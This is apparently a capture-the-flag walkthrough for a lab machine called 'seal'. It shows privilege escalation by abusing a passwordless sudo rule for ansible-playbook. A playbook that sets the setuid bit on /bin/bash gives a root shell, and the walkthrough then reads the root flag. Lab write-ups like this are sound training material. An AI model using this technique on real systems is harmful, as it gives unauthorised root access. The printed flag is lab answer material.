# Enumeration -

```bash
luis@seal:~$ sudo -l
Matching Defaults entries for luis on seal:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User luis may run the following commands on seal:
    (ALL) NOPASSWD: /usr/bin/ansible-playbook *
```

- We can run ansible as root.
- We can create a bad yml file and make it run any command as root.


# Exploitation -

### Creating yml file:

```bash
luis@seal:/tmp$ cd /tmp
luis@seal:/tmp$ nano napster.yml
luis@seal:/tmp$ cat napster.yml 
- hosts: localhost  
  tasks:  
  - name: napster  
    command: "chmod +s /bin/bash"
```

### Executing as root:

```bash
luis@seal:/tmp$ sudo /usr/bin/ansible-playbook napster.yml
[WARNING]: provided hosts list is empty, only localhost is available. Note that the implicit localhost does not match 'all'

PLAY [localhost] *********************************************************************************************************************************************

TASK [Gathering Facts] ***************************************************************************************************************************************
ok: [localhost]

TASK [napster] ***********************************************************************************************************************************************
[WARNING]: Consider using the file module with mode rather than running 'chmod'.  If you need to use command because file is insufficient you can add 'warn:
false' to this command task or set 'command_warnings=False' in ansible.cfg to get rid of this message.
changed: [localhost]

PLAY RECAP ***************************************************************************************************************************************************
localhost                  : ok=2    changed=1    unreachable=0    failed=0    skipped=0    rescued=0    ignored=0   

luis@seal:/tmp$ /bin/bas
base32    base64    basename  bash      bashbug   
luis@seal:/tmp$ /bin/bash -p
bash-5.0# id
uid=1000(luis) gid=1000(luis) euid=0(root) egid=0(root) groups=0(root),1000(luis)
bash-5.0# cd /root/
bash-5.0# ls
root.txt  snap
bash-5.0# cat root.txt 
834ca225259c6fc563dec813b8d78b3c
```